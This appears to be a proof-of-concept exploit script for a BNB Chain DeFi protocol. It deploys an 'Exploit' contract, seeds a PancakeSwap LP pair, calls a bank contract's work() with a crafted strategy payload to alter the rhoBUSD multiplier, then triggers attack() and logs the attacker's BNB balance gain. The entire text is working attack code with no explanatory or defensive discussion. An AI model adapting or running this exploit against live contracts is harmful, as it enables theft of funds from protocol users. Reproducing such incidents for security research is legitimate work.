async function work() {
  let beforeMultiplier = (await rhoBUSD.getMultiplier());
  console.log("Before multiplier:", beforeMultiplier._multiplier.toBigInt());

  // create token and pancake token pair and send seom LP token to strategy address.
  let exploitContract = await new Exploit__factory(bob).deploy();
  await exploitContract.deployTransaction.wait()
  await (await exploitContract.preWork({value: parseEther("0.5")})).wait();

  let lpAddress = await exploitContract.lp();
  let lpContract = new PancakePair__factory().connect(bob).attach(lpAddress);
  let tokenAddress = await exploitContract.token();
  let tokenContract = new ERC20__factory().connect(bob).attach(tokenAddress);

  let strategy = "0x5085c49828B0B8e69bAe99d96a8e0FCf0A033369"
  let lpData = defaultAbiCoder.encode(["address"], [lpAddress])
  let data = defaultAbiCoder.encode(['address', "bytes"], [strategy, lpData]);

  await (await bankContract.work(0, 20, await BUSD.balanceOf(bankContract.address),data, {gasLimit: 29000000} )).wait();

  let afterMultiplier = (await rhoBUSD.getMultiplier());
  console.log("After multiplier: ", afterMultiplier._multiplier.toBigInt());


  console.log("Bob's BNB balance:", await getETHBalance(bob.address));
  console.log("exploiting...");

  await (await exploitContract.attack()).wait();

  console.log("Bob's BNB balance:", await getETHBalance(bob.address));
}
